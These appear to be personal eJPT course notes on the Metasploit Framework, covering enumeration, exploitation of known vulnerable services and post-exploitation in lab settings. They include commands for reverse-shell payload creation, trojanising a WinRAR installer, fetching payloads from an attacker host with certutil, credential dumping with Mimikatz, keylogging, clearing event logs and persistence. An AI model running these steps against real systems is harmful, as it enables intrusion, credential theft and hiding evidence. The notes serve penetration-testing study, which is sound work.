# 08hakr's Short notes of e	JPT
# 008 INE-Host-and-Network-Penetration-Testing-The-Metasploit-Framework-MSF
- Directory location
- /usr/share/metasploit-framework/modules
- user specified modules are stored in ~/.ms4/modules
## Data base connection to
- service start postgresql
- msfdb init
- msfconsole
- db_status
- if connection is not satisfied then update the metasploit-framework to the latest one
```
sudo apt-get update && sudo apt-get install metasploit-framework
```
- msfconsole- db_status

## Msfconsole Fundametals
### Variable:
- local and global set with set and setg respectively.
- LHOST
- LPORT
- RHOST
- RHOSTS
- RPORT

### commands
- show
- search
- options
- add -h to get help
- search <name-service>
- search cve:2017 type:exploit platform:windows
- connect command
- loot
- notes
- hosts
- services
- vulns
- loot For credentials
- creds

### Workspaces
- keeps track and record and scnnig of everu target.
- workspace -a <workspacec-name>
- db_status
- workspace -h
- hosts

## information Gathering
### Port Scanning with nmap and import the result to the nmap
- nmap -Pn -sV -O <target-ip> -oX windows_server
- workspace win12k
- db_import /root/windows_server
- hosts
- services
- vulns
- loot For credentials
- creds
- notes
- nmap Scanning inside metasploit
- db_nmap -Pn -sV -O <taret-ip>

### Port Scanning with Auxiliary module
- WHY: Consider we get access to the target but we have to scan the target netwrok device which are not on the internet so we can't use NMAP here thats why.
- Lab:
- service postgresql start
- msfconsole
- workspace -a port scan
- search portscan
- use set run
- curl
- search xoda
- use set run
- run autoroute -s <target-ip2>
- background OR ctrl+Z
- search portscan
- use set run set rhosts <target-ip2>
- here we have added a route so we are going to scan the target-2 through a target-1
- udp_sweep for udp scan
### FTP enumeration 21- ftp version
- ftp_login
- ls get cat
### SMB enumeration 445 139- service postgreql start
- workspace -a smb_enum
- smb_version use set run
- smb_enumusers
- search smb_enumshares
- smb_login
- $ smbclient -L \\\\<target-ip>\\ -U admin (List of available share)
### webServer Enumeration 80 445
- http_version
- http_header
- robots_txt
- try to access what is denied
- dir_scanner
- files_dir
- http_login
- namlist.txt unix_passwords.txt- apache_userdir_enum To find Valid users
### MySQL Enumeration 3306
- msfconsole
- search type:auxiliary name:mysql
- mysql_version
- portscan/tcp
- mysql_login
- mysql_enum
- mysql_sql
- mysql_schemadump
- mysql -h <target-ip> -u root -p

### SSH Enumeration 22
- worlspace -a ssh_enum
- search type:auxiliary name:ssh
- ssh_version
- ssh_login
- ssh_enumusers

### SMTP Emumeration 25 465 587
- service postgrsql start
- workspace -a smtp_enum
- search type:auxiliary name:smtp
- smtp_version
- smtp_enum


## Vulnerability scanning
### with MSF
- msfconsole
- db_status
- db_nmap -sS -sV -O <target-ip>
- hosts- services
- searchsploit <service>
- metasploit-autopwn Plugin for Metasploit
- load db_autopwn
- db_autopwn -p -t
- analyze
- vulns

### With Nessus and how to import nessis to the metasploit
- install it first
- click export then nessus
- msfconsole
- db_import ms3.nessus
- hosts
- services
- vulns
- search cve:2017 name:smb

### web app VUlnerability Scanning with WMAP
- WMAP plugin in MSF
- load wmap
- wmap_TAB
- wmap_sites -a <target-ip>
- wmap_targets -t http://<target-ip>/
- wmap_sites -l
- wmap_run -t
- wmap_run -e
- wmap_vuln -l

## Client Side Attacks
- windows: exe dll
- linux: elf
### Msfvenom Creating Payloads
- msfvenom --list payload
- msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> Lport=1234 -f exe > winpayload.exe
- msfvenom --list formats
- msfconsole
- use multi/handler
- set payload same paload use while creating payloaf
- set lhost and lport
### encoding palyload with msfvenom
- msfvenom --list encoders
- msfvenom -p windows/meterepreter/reverse_tcp  LHOST=_<attackers-ip> LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/Desktop/payload/encoded_payload.exe
- msfvenom -p windows/meterepreter/reverse_tcp  LHOST=_<attackers-ip> LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/payload/encoded_payload.exe
-

### Injectiong Payloads into windows portable Executables
- Download WinRAR
- msfvenom -p windows/meterepreter/reverse_tcp  LHOST=_<attackers-ip> LPORT=1234 -e x86/shikata_ga_nai -f exe -x ~/Downloads/wrar602.exe > ~/Desktop/payload/winrar.exe
- set multi handler
- upload and run it on windows system.
- option -k to maintain the setup functionality
- in meterpreter
- rub post/windows/manage/migrate


### Automating Metasploit With Resource Scripts
- ls -al /usr/share/metasploit-framework/scripts/resource
- write this in single file
```
use multi/handler
set pyload windows/meterpreter/reverse_tcp
set lhost <attacker-ip>
set lport 1234
run
```
- save as handler.rc- msfconsole -r handler.rc
- nano portscan.rc
```
use auxiliary/scanner/portscan/tcp
set rhosts <target-ip>
run
```
- msfconsole -r portscan.rc
- nano db_status.rc
```
db_status
workspace
workspace -a test
```
- msfconsole
- resource ~/Desktop/handler.rc
- msfconsole
- use portscan set run
- makerc ~/Desktop/portscan.rc


## Exploitation
## Windows Exploitation
### Exploiting Http file Server Rejetto HFS
- service postgresql start
- workspace -a rejetto
- setg- db_nmap -sS -sV -O <target-ip>
- search type:exploit name:rejetto
- use set run
### Exploiting Windows MS17-010 Vulnerability Eternal Blue
- windows vista, 7 ,server 2008, 8.1, server 2012, 10, server 2016
- search etrnalblue
- use set run

### Exploiting WinRM 5985 5986
- /wsman
- db_nmap -sS -sV -O -p- <target-ip>
- search type:auxiliary name:winrm
- use winrm_auth_method
- set run
- search winrm_login
- set user_file common_usrs.txt
- set pass_file unix_passwords.txt
- search winrm_cmd
- search winrm_script_exec
- set force_vbs true

### Exploiting A Vulnerable Apache Tomcat Server
- service postgresql start
- db_nmap -sS -sV -O <target-ip>
- search type:exploit tomacat_jsp
- show options
- info
- set payload java/jsp_shell_bind_tcp
- set shell cmd
- run
- create a payload with msfvenom
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=1234 -f exe > meterpreter.exe- sudo python -m Simplehttp.server 80
- certutil -urlcache -f http://<attacker-ip>:80/meterpreter.exe meterpreter.exe
- create a multihandler script
- nano handler.rc
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set Lhost
set lport
run
```
- msfconsole -r handler.rc
- .\meterpreter.exe

### Exploiting A Vulnerable FTP Server 21 V2.3.4
- service postgresql start
- msfconsole
- workspace -a vsdtpd
- sb_nmap -sS -sV -O <target-ip>
- services
- analyze
- search vsftpd
- use set run
- ctrl+Z
- search shell_to_meterpreter- use set run

### Exploiting SAMBA 445 on TCP, 139 on netbios
- db_nmap -sS -sV -O <target-ip>
- search type:exploit name:samba
- is_known_pipename
- use set run
- upgrade to meterpreter
- search shell_to_meterpreter
- use set run
- sessions

### Exploiting A Vulnerable SSH Server 22 TCP libssh V0.6.0-V0.8.0
- service postgresql start
- workspace -a libssh
- db_nmap -sS -sV -O <target-ip>
- services
- search libssh_auth_bypass
- use set run
- set spawn_pty true
- sessions
- cat /etc/*release
- unmae -r For Kernal Version
- upgrade the shell to meterpreter
- search shell_to_meterpreter
- use set run

### Exploiting Vulnerable SMTP Server TCP 25, 465, 587
- SMTP Haraka V2.8.9 and prior version
- service postgresql start
- workspace -a haraka
- search- setg rhosts- db_nmap -sV -sS -O <target-ip>
- search type:exploit name:haraka
- use set run
- set srvport 9898
- set email_to root@attackdefense.test
- set payload linux/x64/meterpreter_reverse_http
- set lhost eth1
- run- sysinfo
- getuid

## Post Exploitation Fundamentals
### Meterpreter Fundamentals
- service postgresql start
- db_nmap -sS -sV -O <target-ip >
- sysinfo
- ge tuid
- sessions -C 'sysinfo' -i 1 command execution
- session -k 1 KILL
- sessiona -n xoda -i 1
- download flag.zip
- checksum md5 /bin/bash
- getenv PATH
- get env TERM
- search -d /usr/bin -f *<file-name>*
- search -f *.jpg
- shell
- ps
- migrate <ps-id>
- getuid for enumeration of current user

### Upgrading Command Shell into Meterpreter shell
- module shell_to_ meterprerter
- service postgresql start
- msfconsole
- workspace upgrading-shell
- sessions -h- sessions -u 1  To upgrade shell to meterpreter


## Post Exploitation Of Windows
- getsystem For priviliges Escalation
- service postgresql start
- migrate, download, upload search, hashdump
- search win_privs
- search enum_logged_on
- search checkvm
- search enum_applications
- loot
- search type:post platform:windows enum_av- search enum_computer
- search enum_patches
- mannual of above meterpreter
- shell
- systeminfo
- search enum_shares
- search rdp platform:windows
- use enable_rdp

## Windows Privileges Escalation
### Bypassing UAC: Memory Injection
- service postgresql start
- workspace -a UAC
- nmap search and exploit
- set payload windows/x64/meterpreter/reverse_tcp
- getsystem for Priviliges escalation
- getprivs to get current user privileges
- shell, net user, net localgroup administrators- net user group Administrator
- search bypassuac_injection
- set payload windows/x64/meterpreter/reverse_tcp
- use set run
- set target windows\ x64
- getsystem

### Token Impersonation With Incognito Lsass- Lsass
- service postgresql start
- msfconsole
- workspace -a imperonate
- search
- nmap, identify, use, set, exploit
- set payload windows/x64/meterpreter/reverse_tcp
- sysinfo
- getprivs
- SeImpersonatePrivilege THis Persmission need for token impersonation
- load incognito
- list_tokens -u
- copy the token name
- impersonate_token <name-of-token>
- migrate to the process that is the process of impersonate_token and boom
- sysinfo- hashdump
- getuid
-

### Dumping Hashes With Mimikatz/tool is use to find plaintext password OR Hashes
- service postgesql start
- workspace -a mimikatz
- nmap, identify, search, exploit
- badblue_passthru
- set target badBlue\ EE\ 2.7
- pgrep lsass
- migrate <id>
- sysyinfo
- load kiwi- help
- creds_all
- lsa_dump_sam
- lsa_dump_secrets
- upload /usr/share/windows-resources/binaries-OR-mimikatz/
- .\mimikatz.exe
- privilige::debug
- sekurlsa::logonpasswords
- lsadump::sam
-
### Pass the Hash
- PsExec
- badblue
- getuid, sysinfo
- pgrep lsass
- hash dump

### Establishing Persistence On Windows
- service postgresql start
- workspace -a persistant
- nmap identify exploit
- payload to windows/x64/me/re_tcp
- getuid sysinfo
- search type:post platform:windows persistance

### Enabling RDP 3389
- service postgresql start && msfconsole
- setg rhost <target-ip>
- nmap identify exploit
- getuid sysinfo
- search enable_rdp
- nmap -sV -p3389 <target-ip>
- shell
- net users
- net user administrator <new-password>
- xfreerdp  /u:administrator /p:<password> /v:<target-ip>
-
### Windows KeyLogging
- service postgresql start && msfconsole
- search badblue nmap identify exploit
- sysinfo getuid
- pgrep explorer
- migrate <ps-id>
- help
- keyscan_start
-
### Clearing Evenet Logs On Windows System
- application logs, system logs, Security logs
- service postgresql start && msfconsole
- workspace -a clearev
- nmap identify exploit
- sysinfo getuid
- open EventViewer Application
- shell
- net user administrator <new-password> Password Change
- in meterpreter- clearev
-

### Pivoting
- service postgresql start && msfconsole
- workspace -a pivoting
- nmap identify exploit
- in meterpreter
- sysinfo getuid
- run autoroute -s <target-ip2>/20
- sessions -n victim-1 -i 1
- search portscan
- set rhosts <target-ip2>
- set ports 1-100
- sessions 1
- portfwd add -l 1234 -p 80 -r <target-ip2> This is added to our own localhost
- so we need to scan our own machine with forwarded port
- db_nmap -sS -sV -p1234 localhost- search badblue_passthru
- use set run
- Reverse tcp Doesnt work at Pivoting- set exploit/windows/meterpreter/bind_tcp
- set rhosts <target-ip2>
- sessions
- enum_system
- loot
- notes X

### Linux Post Exploitation
- servuce postgresqls start
- workspace -a samba
- nmap identify exploit
- search enum_config
- loot
- search env platform:linux
- enum_network
- search enum_protections
- notes
- search checkcontainer
- search checkvm
- enum_users_histor
- search checkcontainer
- search checkvm
- enum_users_history 

### Local Enumeration for Linux
- /bin/bash -i
- whoami
- cat /etc/passwd to get users
- groups root
- cat /etc/*issue Distribution Version
- uname -r kernel version
- ifconfig
- ip a s- netstat -antp various services running on network
- ps aux Process on system
- env for environment variables

### Linux Privileges Escalation
- service postgresql start
- workpspace - a linuxprives
- setg <>
- search ssh_login
- cat /etc/*isssue
- uname -r
- sessions -u 1
- cat /etc/passwd
- ps aux
- cat /bin/check-down
- chkrootkit -help
- search chkrootkit

### Dumping Hashes With HashDump
- /etc/shadow
- /etc/passwd
- service postgresql start
- workspace -a hashdump
- nmap identify exploit
- get session and upgrade it
- hashdump
- search hashdump

### Establishing Persistance On Linux
- service postgresql start && msfconsole
- search ssh_login exploit
- sessions -u 1 upgrade
- search chkrootkit 
- set
- set chkrootkit /bin/chkrootkit
- useradd -m ftp -s /bin/bash
- groups root
- usermod -aG root ftp
- usermod -u 15 ftp
- search platform:linux persistance
- search apt_package_manager_persistance
- search cron_persitance
- search service_persistance
- set target 3
- search sshkey_persitence
- set createsshfolder true
- set session 4
- exit
- nano ssh_key 
- paste the private ssh_key
- chmod 0400 ssh_key
- ssh -i ssh_key root@<target-ip>

### Armitage
- GUI
- service postgresql start && msfconsole
- 
